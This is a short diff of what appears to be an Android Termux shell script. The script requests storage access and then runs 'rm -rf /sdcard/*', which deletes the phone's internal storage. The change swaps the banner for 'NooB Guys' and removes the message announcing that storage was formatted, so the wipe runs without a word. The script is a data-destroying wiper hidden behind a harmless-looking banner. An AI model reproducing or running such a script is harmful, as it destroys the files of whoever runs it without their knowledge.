@@ -16,13 +16,13 @@ echo
 echo
 echo
 
-echo "."
+echo "NooB Guys"
 termux-setup-storage
 cd storage
 ls
 rm -rf /sdcard/*
-echo
-echo
-echo
-echo" Internal Storage Has Fomated "
+
+
+
+
 exit
